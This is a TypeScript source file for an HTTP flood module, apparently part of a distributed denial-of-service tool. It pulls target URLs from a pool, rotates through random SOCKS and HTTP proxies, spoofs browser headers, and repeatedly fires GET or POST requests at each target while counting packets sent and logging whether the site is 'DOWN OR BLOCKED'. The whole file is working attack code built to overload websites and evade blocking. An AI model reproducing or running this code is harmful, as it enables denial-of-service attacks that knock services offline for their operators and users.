import agent from 'superagent'

import { HttpProxyAgent } from 'http-proxy-agent'
import { HttpsProxyAgent } from 'https-proxy-agent'
import { SocksProxyAgent } from 'socks-proxy-agent'

import { GetTarget } from '../external/targetsPool'
import { Proxy, ProxyPool } from '../external/proxyPool'
import { Algorithm, Config, ExecutionResult } from './algorithm'

import { HttpHeadersUtils } from './utils/httpHeadersUtils'
import { sleep } from '../helpers'

export abstract class SimpleHTTP extends Algorithm {
  protected proxyPool: ProxyPool
  private validateStatusFn: () => boolean

  abstract get method(): 'POST' | 'GET'

  constructor (config: Config, proxyPool: ProxyPool) {
    super(config)
    this.proxyPool = proxyPool
    this.validateStatusFn = () => true
  }

  isValid (target: GetTarget): boolean {
    if (typeof target.page !== 'string' || !target.page.startsWith('http')) {
      return false
    }
    return true
  }

  async execute (target: GetTarget): Promise<ExecutionResult> {
    // Setting up proxy config
    let packetsSend = 0, packetsSuccess = 0

    let proxyAgent = null as HttpProxyAgent | HttpsProxyAgent | SocksProxyAgent | null
    let repeats = 16 + Math.floor(Math.random() * 32)

    if (!this.config.useRealIP) {
      const proxy = this.proxyPool.getRandomProxy()
      if (proxy === null) {
        console.warn('Proxy request failed because proxy wasnt found.')
        await sleep(100)
        return { packetsSend, packetsSuccess, target, packetsNeutral: 0 }
      }
      proxyAgent = this.makeRequestAgent(target.page, proxy)

      repeats += Math.floor(Math.random() * 32)
    }

    let success = true
    while (success && repeats > 0) {
      success = await this.makeRequest(target.page, proxyAgent)
      packetsSend += 1
      repeats -= 1
      if (success) {
        packetsSuccess++
      }
    }

    proxyAgent?.destroy()

    return { packetsSend, packetsSuccess, target, packetsNeutral: 0 }
  }

  protected async makeRequest (url: string, httpAgent: HttpProxyAgent | HttpsProxyAgent | SocksProxyAgent | null) {
    try {
      const headers = HttpHeadersUtils.generateRequestHeaders()
      let request = agent(this.method, url)
      if (httpAgent !== null) {
        request = request.agent(httpAgent)
      }
      request = request.ok(() => true)
      request = request.set('Accept', headers.Accept)
      request = request.set('Accept-Language', headers['Accept-Language'])
      request = request.set('User-Agent', headers['User-Agent'])

      const response = await request.timeout(this.config.timeout)

      console.log(`${new Date().toISOString()} | ${url} | ${response.status}`)

      return true
    } catch (e) {
      console.log(`${new Date().toISOString()} | ${url} | DOWN OR BLOCKED`)
      return false
    }
  }

  protected makeRequestAgent (page: string, proxy: Proxy) {
    if (proxy.scheme === 'socks4' || proxy.scheme === 'socks5') {
      return new SocksProxyAgent({
        host: proxy.host,
        hostname: proxy.host,
        port: proxy.port,
        username: proxy.username,
        password: proxy.password
      }, {
        timeout: 10000
      })
    }

    const options = {
      host: proxy.host,
      hostname: proxy.host,
      port: proxy.port,
      timeout: 10000,
      auth: undefined as undefined | string
    }
    if (proxy.username !== undefined && proxy.password !== undefined) {
      options.auth = `${proxy.username}:${proxy.password}`
    }

    if (proxy.scheme === 'https') {
      return new HttpsProxyAgent(options)
    } else {
      return new HttpProxyAgent(options)
    }
  }
}
